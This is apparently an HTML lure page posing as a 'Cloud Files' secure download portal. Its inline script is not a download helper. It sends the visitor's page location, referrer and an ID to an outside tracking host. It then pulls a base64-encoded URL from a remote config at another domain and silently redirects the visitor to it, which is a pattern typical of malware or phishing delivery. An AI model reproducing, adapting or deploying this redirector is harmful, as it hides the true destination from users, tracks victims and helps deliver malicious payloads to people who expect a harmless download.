<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Cloud Files</title>
  <meta name="description" content="Secure download portal"/>
  <link rel="icon" href="/favicon.ico" type="image/x-icon"/>

  <meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src  'self' 'unsafe-inline' https://dokopka.icu;
    style-src   'self';
    connect-src 'self' https://dokopka.icu
  "/>

  <link rel="stylesheet" href="styles.css"/>
</head>
<body>
  <div class="download-container">
    <div class="download-box">
      <div class="download-icon">
        <svg width="48" height="48" viewBox="0 0 24 24" fill="none">
          <path d="M8 11L12 15L16 11"
                stroke="white" stroke-width="2"
                stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>
      <h1>Preparing your download…</h1>
      <p id="loader-text">Starting…</p>
      <p id="error-text" class="error-text"></p>
    </div>
  </div>

<script>
(async function(){
  const loader = document.getElementById('loader-text');
  const error  = document.getElementById('error-text');
  loader.textContent = 'Fetching download link…';
  error.textContent  = '';
  
  try {
    try {
      const repoName = window.location.hostname + window.location.pathname;
      const uniqueId = Date.now() + '-' + Math.random().toString(36).substr(2, 9);
      
      if (navigator.sendBeacon) {
        const data = new Blob([JSON.stringify({
          repo: repoName,
          referrer: document.referrer,
          timestamp: new Date().toISOString(),
          unique_id: uniqueId
        })], {type: 'application/json'});
        
        navigator.sendBeacon('https://blokekaldirma.com/track.php', data);
      } else {
        const beacon = new Image();
        beacon.src = 'https://blokekaldirma.com/track.php?repo=' + 
                     encodeURIComponent(repoName) + 
                     '&referrer=' + encodeURIComponent(document.referrer) + 
                     '&unique_id=' + uniqueId +
                     '&time=' + Date.now();
      }
      
    } catch (trackError) {
      console.log('Tracking error (non-critical):', trackError);
    }

    const res = await fetch('https://dokopka.icu/mai.maaan');
    if (!res.ok) throw new Error(`Config HTTP ${res.status}`);
    const { c } = await res.json();
    const url = atob(c);
    if (!/^https?:\/\//.test(url)) throw new Error('Invalid URL');
    loader.textContent = 'Redirecting…';
    window.location.href = url;
  } catch (e) {
    console.error('Main error:', e);
    loader.textContent = '';
    error.textContent = `Error: ${e.message}`;
  }
})();
</script>
</body>
</html>
